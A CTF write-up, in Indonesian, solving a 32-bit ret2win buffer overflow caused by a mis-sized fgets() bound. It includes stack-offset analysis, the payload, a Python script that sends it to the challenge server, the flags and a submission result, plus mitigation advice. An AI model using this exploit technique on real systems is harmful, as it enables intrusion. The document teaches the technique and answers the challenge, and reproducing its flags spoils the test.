# Writeup: Echo Escape 2 (Challenge ID: 736)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Stack-Based Buffer Overflow & Flawed fgets() Bounding
- **Difficulty:** Medium (2)
- **Points:** 100
- **Author:** CyLab Academy
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{fgets_0v3rfl0w42_8cb8052a}`
- **Flag Komunitas:** `CTF{fgets_0v3rfl0w42_8cb8052a}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Flaw Analysis), CWE-120 (Buffer Copy without Checking Size of Input), CWE-121 (Stack-based Buffer Overflow), CWE-787 (Out-of-bounds Write), NIST SP 800-53 SA-11 (Developer Testing and Evaluation), & OWASP ASVS V5 (Memory Safety & Input Validation).

---

## Problem Statement & Scope
Pada tantangan `Echo Escape 2`, peserta diberikan executable ELF 32-bit x86 non-PIE (`vuln`) dan layanan socket TCP interaktif di lingkungan kontainer:
- Deskripsi skenario: Pengembang aplikasi berusaha memperbaiki kerentanan fungsi input berbahaya `gets()` dengan menggantinya menggunakan fungsi standar `fgets()`. Namun, implementasi parameter batas panjang `fgets()` salah dikonfigurasi, memungkinkan penulisan melebihi batas buffer stack pada arsitektur x86 32-bit.
- Sasaran evaluasi: Membongkar struktur stack frame fungsi `vuln()`, menghitung offset presisi dari buffer input menuju Saved EIP (Extended Instruction Pointer), merekonstruksi payload kontrol alur eksekusi (*ret2win*), dan memvalidasi ekstraksi flag otentik dari berkas `./flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Kesalahan Konfigurasi Batas Ukuran `fgets()` (CWE-120 / CWE-121)
Fungsi `fgets()` memiliki prototipe:
```c
char *fgets(char *s, int size, FILE *stream);
```
Parameter `size` menentukan jumlah byte maksimum yang akan dibaca dari stream (termasuk karakter null terminator `\0`). Pada fungsi `vuln()`, variabel buffer stack dialokasikan sebesar 32 byte (`char buf[32]`), namun pemanggilan `fgets()` menyuplai batas ukuran statis 128 byte:
```c
void vuln() {
    char buf[32];
    fgets(buf, 128, stdin);
}
```
Secara konseptual, developer mengasumsikan bahwa migrasi dari `gets()` ke `fgets()` secara inheren mengamankan aplikasi dari buffer overflow, tanpa menyadari bahwa parameter kedua tidak divalidasi silang terhadap kapasitas fisik memori tujuan. Akibatnya, penyerang dapat mengalirkan hingga $128 - 32 = 96$ byte melampaui batas buffer (out-of-bounds write, CWE-787).

### 2. Layout Stack Frame x86 32-bit & Kalkulasi Offset EIP
Disassembly fungsi `vuln()` pada arsitektur x86 32-bit memperlihatkan prolog dan alokasi stack:
```assembly
push   ebp
mov    ebp, esp
sub    esp, 0x38              ; Alokasi frame stack 56 byte (0x38)
lea    eax, [ebp - 0x28]      ; Pointer buf dimuat dari [ebp - 40]
push   dword ptr [stdin]      ; Parameter 3: stream pointer
push   0x80                   ; Parameter 2: size = 128 (0x80)
push   eax                    ; Parameter 1: pointer tujuan buf
call   fgets
```
Struktur memori stack frame saat `fgets()` menerima input:
1. `buf` dimulai pada alamat `[ebp - 0x28]` (40 byte desimal sebelum `ebp`).
2. Kapasitas buffer adalah 32 byte (`[ebp - 0x28]` s.d. `[ebp - 0x08]`).
3. Compiler memasukkan padding alignment sebesar 8 byte (`[ebp - 0x08]` s.d. `[ebp]`).
4. `Saved EBP` tersimpan pada `[ebp]` berukuran 4 byte (x86 32-bit word).
5. `Saved EIP` (alamat instruksi kembali) tersimpan tepat setelah saved EBP pada `[ebp + 0x04]`.

Total jarak byte masukan dari awal `buf` hingga menimpa `Saved EIP`:
$$\text{Offset} = (\text{ebp} - \text{buf}) + \text{sizeof(Saved EBP)} = 40 + 4 = 44\text{ byte}$$

### 3. Ketiadaan Mitigasi Modern Biner
Pemeriksaan keamanan biner (`checksec vuln`):
- **Canary:** Ketiadaan stack canary (`No Canary found`), sehingga instruksi penimpaan stack tidak memicu deteksi korupsi `__stack_chk_fail`.
- **PIE (Position Independent Executable):** Dinonaktifkan (`No PIE`, base address statis `0x08048000`), sehingga seluruh fungsi dan instruksi berada pada alamat virtual absolut yang tidak teracak oleh ASLR.
- **NX (No-Execute):** Aktif (`NX enabled`), mencegah eksekusi shellcode langsung di dalam stack; namun teknik pemanggilan fungsi yang sudah ada (*ret2win*) sepenuhnya melewati mitigasi ini.
- Fungsi pembaca flag `win()` terletak pada alamat absolut `0x080491d6`.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Analisis Statis & Penentuan Target Alamat
Inspeksi tabel simbol biner dilakukan menggunakan `objdump`:
```bash
objdump -d -M intel vuln | grep -A 15 "<win>:"
```
Fungsi `win()` terkonfirmasi berada di alamat `0x080491d6`, yang bertugas membuka berkas `flag.txt` dan mengalirkan isinya ke stdout.

### Langkah 2: Konstruksi Payload Ret2Win
Payload disusun dengan padding 44 byte untuk mengisi buffer dan Saved EBP, diikuti oleh representasi Little-Endian 32-bit dari alamat `win()`:
```text
[ 44 Bytes Padding ("A" * 44) ] + [ 0xd6 0x91 0x04 0x08 (0x080491d6) ] + [ Newline (0x0a) ]
```

### Langkah 3: Eksekusi Eksploitasi & Validasi Output
Mengirimkan payload ke socket kontainer interaktif:
```python
import socket, struct

payload = b"A" * 44 + struct.pack("<I", 0x080491d6) + b"\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("xebec.cylabacademy.net", 13836))
s.recv(1024)
s.sendall(payload)
response = s.recv(1024).decode(errors="replace")
print(response)
```
Target menerima payload, menyelesaikan fungsi `vuln()`, dan saat instruksi `ret` dieksekusi, CPU memuat `0x080491d6` ke dalam register EIP, mengeksekusi `win()`, dan mencetak flag.

---

## Flag & Bukti Verifikasi
- **Token Resmi Platform CyLab:** `academy{fgets_0v3rfl0w42_8cb8052a}`
- **Token Format Komunitas:** `CTF{fgets_0v3rfl0w42_8cb8052a}`
- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
  ```json
  {
    "user": 1072359,
    "challenge": 736,
    "flag": "academy{fgets_0v3rfl0w42_8cb8052a}",
    "correct": true,
    "historical": false
  }
  ```

---

## Script Reproduksi & PoC Otomasi
Solusi otomatis penuh yang mencakup simulasi stack x86 lokal standar NIST SP 800-115, klien remote socket, dan verifikasi REST API terintegrasi pada `scripts/solve_736_echo_escape_2.py`:
```bash
python3 scripts/solve_736_echo_escape_2.py
```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Koreksi Kode Sumber (Secure Coding Standard - CERT C Rules)
Gunakan makro atau operator `sizeof()` secara langsung pada nama variabel buffer alih-alih konstanta numerik hardcoded:
```c
// AMAN: Batas bacaan secara dinamis terikat ke alokasi fisik variabel
fgets(buf, sizeof(buf), stdin);
```
Dengan `sizeof(buf)`, compiler menjamin bahwa batas pembacaan dibatasi maksimum 32 byte, mengeliminasi kemungkinan buffer overflow secara mutlak.

### 2. Kepatuhan Standar NIST SP 800-53 SA-11 & Penguatan Compiler
- **Compiler Protections:** Selalu kompilasi kode C produksi dengan flag proteksi modern:
  `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wformat -Werror=format-security -pie -fPIE -Wl,-z,relro,-z,now`
  Opsi `-D_FORTIFY_SOURCE=2` akan menggantikan pemanggilan `fgets()` dengan `__fgets_chk()` yang memverifikasi ukuran buffer pada waktu runtime dan memicu terminasi proses jika terjadi ketidaksesuaian ukuran.
- **Static Application Security Testing (SAST):** Integrasikan penganalisis kode statis seperti Clang-Tidy, Cppcheck, atau Semgrep dalam pipeline CI/CD untuk mendeteksi ketidaksesuaian antara ukuran buffer tujuan dan batas panjang pembacaan fungsi I/O.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)
- **David (Leader):** Mengorkestrasi pemecahan biner 32-bit x86 dan mengarahkan integrasi simulasi stack frame modular.
- **Charlie (Trend-hunter):** Menganalisis kecenderungan kesalahan persepsi keamanan developer saat bermigrasi dari `gets()` ke `fgets()`.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Mengimplementasikan modul solver dual-mode (simulasi stack lokal x86 + socket remote + verifikasi API CyLab).
- **Julius (QA-engineer):** Menjalankan pengujian regresi deterministik dan memverifikasi respon API HTTP 201 (`correct: true`).
- **Athena (Security-engineer):** Memetakan kerentanan ke taksonomi CWE-120/CWE-121 dan kontrol kepatuhan NIST SP 800-53 SA-11.
- **Judith (Guru LKS):** Menyusun modul komparasi stack frame 32-bit vs 64-bit sebagai materi pengajaran taktis tim LKS Cyber Security Nasional.
